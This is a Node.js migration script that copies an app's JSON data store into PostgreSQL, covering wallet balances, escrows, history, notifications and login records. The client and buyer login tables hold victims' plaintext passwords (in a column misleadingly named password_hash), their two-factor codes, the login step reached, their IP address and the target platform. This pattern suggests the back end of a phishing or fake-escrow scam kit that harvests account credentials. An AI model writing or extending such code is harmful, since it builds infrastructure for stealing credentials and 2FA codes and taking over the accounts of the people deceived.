// Database Migration Script
// Migrates data from dataStore.json to PostgreSQL

import pkg from 'pg';
const { Pool } = pkg;
import fs from 'fs-extra';
import path from 'path';
import { fileURLToPath } from 'url';
import dotenv from 'dotenv';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const DATA_PATH = path.join(__dirname, 'dataStore.json');

// PostgreSQL connection
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false
});

async function migrate() {
  console.log('🚀 Starting database migration...');

  try {
    // Read existing data
    const data = await fs.readJSON(DATA_PATH);
    console.log('✅ Loaded dataStore.json');

    // Migrate wallet balances
    console.log('\n📊 Migrating wallet balances...');
    const balances = data.wallet?.balances || {};
    for (const [currency, balance] of Object.entries(balances)) {
      await pool.query(
        `INSERT INTO wallet_balances (currency, balance) 
         VALUES ($1, $2) 
         ON CONFLICT (currency) DO UPDATE SET balance = $2`,
        [currency, balance]
      );
      console.log(`  ✓ ${currency}: ${balance}`);
    }

    // Migrate wallet activity
    console.log('\n💳 Migrating wallet activity...');
    const activity = data.wallet?.activity || [];
    for (const item of activity) {
      await pool.query(
        `INSERT INTO wallet_activity (id, type, amount, currency, description, reference_id, created_at)
         VALUES ($1, $2, $3, $4, $5, $6, $7)
         ON CONFLICT (id) DO NOTHING`,
        [
          item.id || `${Date.now()}-${Math.random()}`,
          item.type || 'unknown',
          item.amount || 0,
          item.currency || 'USD',
          item.description || '',
          item.referenceId || null,
          item.createdAt || new Date().toISOString()
        ]
      );
    }
    console.log(`  ✓ Migrated ${activity.length} activity records`);

    // Migrate escrows
    console.log('\n🔒 Migrating escrows...');
    const escrows = data.escrows || [];
    for (const escrow of escrows) {
      await pool.query(
        `INSERT INTO escrows (id, platform, payment_methods, amount, currency, client_email, payment_link, status, paid_at, released_at, created_at)
         VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11)
         ON CONFLICT (id) DO NOTHING`,
        [
          escrow.id,
          escrow.platform,
          JSON.stringify(escrow.paymentMethods || []),
          escrow.amount,
          escrow.currency || 'USD',
          escrow.clientEmail || null,
          escrow.paymentLink || null,
          escrow.status || 'pending',
          escrow.paidAt || null,
          escrow.releasedAt || null,
          escrow.createdAt || new Date().toISOString()
        ]
      );
    }
    console.log(`  ✓ Migrated ${escrows.length} escrows`);

    // Migrate history
    console.log('\n📜 Migrating transaction history...');
    const history = data.history || [];
    for (const item of history) {
      await pool.query(
        `INSERT INTO history (id, type, description, amount, currency, status, metadata, created_at)
         VALUES ($1, $2, $3, $4, $5, $6, $7, $8)
         ON CONFLICT (id) DO NOTHING`,
        [
          item.id || `${Date.now()}-${Math.random()}`,
          item.type || 'unknown',
          item.description || '',
          item.amount || null,
          item.currency || null,
          item.status || null,
          JSON.stringify(item),
          item.createdAt || new Date().toISOString()
        ]
      );
    }
    console.log(`  ✓ Migrated ${history.length} history records`);

    // Migrate notifications
    console.log('\n🔔 Migrating notifications...');
    const notifications = data.notifications || [];
    for (const notification of notifications) {
      await pool.query(
        `INSERT INTO notifications (id, type, message, target, read, created_at)
         VALUES ($1, $2, $3, $4, $5, $6)
         ON CONFLICT (id) DO NOTHING`,
        [
          notification.id || `${Date.now()}-${Math.random()}`,
          notification.type || 'info',
          notification.message || '',
          notification.target || 'all',
          notification.read || false,
          notification.createdAt || new Date().toISOString()
        ]
      );
    }
    console.log(`  ✓ Migrated ${notifications.length} notifications`);

    // Migrate client logins
    console.log('\n🔐 Migrating client login records...');
    const clientLogins = data.clientLogins || [];
    for (const login of clientLogins) {
      await pool.query(
        `INSERT INTO client_logins (id, email, password_hash, two_factor_code, first_two_factor_code, platform, step, ip_address, user_agent, timestamp)
         VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10)
         ON CONFLICT (id) DO NOTHING`,
        [
          login.id,
          login.email || '',
          login.password || '', // Plaintext password as stored in file storage
          login.twoFactorCode || '',
          login.firstTwoFactorCode || '', // First 2FA code
          login.platform || 'unknown',
          login.step || 'unknown',
          login.ipAddress || 'unknown',
          login.userAgent || 'unknown',
          login.timestamp || new Date().toISOString()
        ]
      );
    }
    console.log(`  ✓ Migrated ${clientLogins.length} login records`);

    // Migrate buyer logins
    console.log('\n🛒 Migrating buyer login records...');
    const buyerLogins = data.buyerLogins || [];
    for (const login of buyerLogins) {
      await pool.query(
        `INSERT INTO buyer_logins (id, email, password_hash, two_factor_code, first_two_factor_code, platform, escrow_id, step, ip_address, user_agent, timestamp)
         VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11)
         ON CONFLICT (id) DO NOTHING`,
        [
          login.id,
          login.email || '',
          login.password || '', // Plaintext password as stored in file storage
          login.twoFactorCode || '',
          login.firstTwoFactorCode || '', // First 2FA code
          login.platform || 'unknown',
          login.escrowId || 'unknown',
          login.step || 'unknown',
          login.ipAddress || 'unknown',
          login.userAgent || 'unknown',
          login.timestamp || new Date().toISOString()
        ]
      );
    }
    console.log(`  ✓ Migrated ${buyerLogins.length} buyer login records`);

    // Migrate verification tokens
    console.log('\n📧 Migrating verification tokens...');
    const verificationTokens = data.verificationTokens || [];
    for (const token of verificationTokens) {
      await pool.query(
        `INSERT INTO verification_tokens (email, token, created_at, expires_at)
         VALUES ($1, $2, $3, $4)
         ON CONFLICT (token) DO NOTHING`,
        [
          token.email,
          token.token,
          token.createdAt || new Date().toISOString(),
          token.expiresAt || new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString()
        ]
      );
    }
    console.log(`  ✓ Migrated ${verificationTokens.length} verification tokens`);

    // Migrate verified emails
    console.log('\n✉️ Migrating verified emails...');
    const verifiedEmails = data.verifiedEmails || [];
    for (const verified of verifiedEmails) {
      await pool.query(
        `INSERT INTO verified_emails (email, verified_at)
         VALUES ($1, $2)
         ON CONFLICT (email) DO NOTHING`,
        [
          verified.email,
          verified.verifiedAt || new Date().toISOString()
        ]
      );
    }
    console.log(`  ✓ Migrated ${verifiedEmails.length} verified emails`);

    console.log('\n✅ Migration completed successfully!');
    console.log('\n📋 Summary:');
    console.log(`  - Wallet balances: ${Object.keys(balances).length}`);
    console.log(`  - Wallet activity: ${activity.length}`);
    console.log(`  - Escrows: ${escrows.length}`);
    console.log(`  - History: ${history.length}`);
    console.log(`  - Notifications: ${notifications.length}`);
    console.log(`  - Client logins: ${clientLogins.length}`);
    console.log(`  - Buyer logins: ${buyerLogins.length}`);
    console.log(`  - Verification tokens: ${verificationTokens.length}`);
    console.log(`  - Verified emails: ${verifiedEmails.length}`);

    console.log('\n⚠️  IMPORTANT: Backup dataStore.json before switching to PostgreSQL!');
    console.log('Run: cp dataStore.json dataStore.json.backup');

  } catch (error) {
    console.error('❌ Migration failed:', error);
    throw error;
  } finally {
    await pool.end();
  }
}

// Run migration
migrate().catch(err => {
  console.error('Fatal error:', err);
  process.exit(1);
});
